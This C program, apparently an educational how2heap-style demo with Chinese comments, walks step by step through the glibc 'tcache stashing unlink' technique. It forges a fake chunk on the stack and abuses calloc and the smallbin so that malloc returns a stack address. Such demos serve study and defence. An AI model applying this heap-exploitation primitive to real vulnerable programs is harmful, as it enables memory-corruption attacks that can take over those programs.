#include <stdio.h>
#include <stdlib.h>

int main(){
    unsigned long stack_var[0x10] = {0};
    unsigned long *chunk_lis[0x10] = {0};
    unsigned long *target;
    unsigned long *pp;

    fprintf(stderr, "stack_var 是我们希望分配到的地址，我们首先把 &stack_var[2] 写到 stack_var[3] 来绕过 glibc 的 bck->fd=bin（即 fake chunk->bk 应该是一个可写的地址）\n");
    stack_var[3] = (unsigned long)(&stack_var[2]);
    fprintf(stderr, "修改之后 fake_chunk->bk 是:%p\n",(void*)stack_var[3]);
    fprintf(stderr, "stack_var[4] 的初始值是:%p\n",(void*)stack_var[4]);
    fprintf(stderr, "现在申请 9 个 0x90 的 chunk\n");

    for(int i = 0;i < 9;i++){
        chunk_lis[i] = (unsigned long*)malloc(0x90);
    }
    fprintf(stderr, "先释放 6 个，这 6 个都会放到 tcache 里面\n");

    for(int i = 3;i < 9;i++){
        free(chunk_lis[i]);
    }
    fprintf(stderr, "接下来的释放的三个里面第一个是最后一个放到 tcache 里面的，后面的都会放到 unsortedbin 中\n");
    
    free(chunk_lis[1]);
    //接下来的就是放到 unsortedbin 了
    free(chunk_lis[0]);
    free(chunk_lis[2]);
    fprintf(stderr, "接下来申请一个大于 0x90 的 chunk，chunk0 和 chunk2 都会被整理到 smallbin 中\n");
    malloc(0xa0);//>0x90
    
    fprintf(stderr, "然后再去从 tcache 中申请两个 0x90 大小的 chunk\n");
    malloc(0x90);
    malloc(0x90);

    fprintf(stderr, "假设有个漏洞，可以把 victim->bk 的指针改写成 fake_chunk 的地址: %p\n",(void*)stack_var);
    chunk_lis[2][1] = (unsigned long)stack_var;
    fprintf(stderr, "现在 calloc 申请一个 0x90 大小的 chunk，他会把一个 smallbin 里的 chunk0 返回给我们，另一个 smallbin 的 chunk2 将会与 tcache 相连.\n");
    pp = calloc(1,0x90);
    
    fprintf(stderr, "这时候我们的 fake_chunk 已经放到了 tcache bin[0xa0] 这个链表中，它的 fd 指针现在指向下一个空闲的块: %p， bck->fd 已经变成了 libc 的地址: %p\n",(void*)stack_var[2],(void*)stack_var[4]);
    target = malloc(0x90);  
    fprintf(stderr, "再次 malloc 0x90 可以看到申请到了 fake_chunk: %p\n",(void*)target); 
    fprintf(stderr, "ojbk\n");
    return 0;
}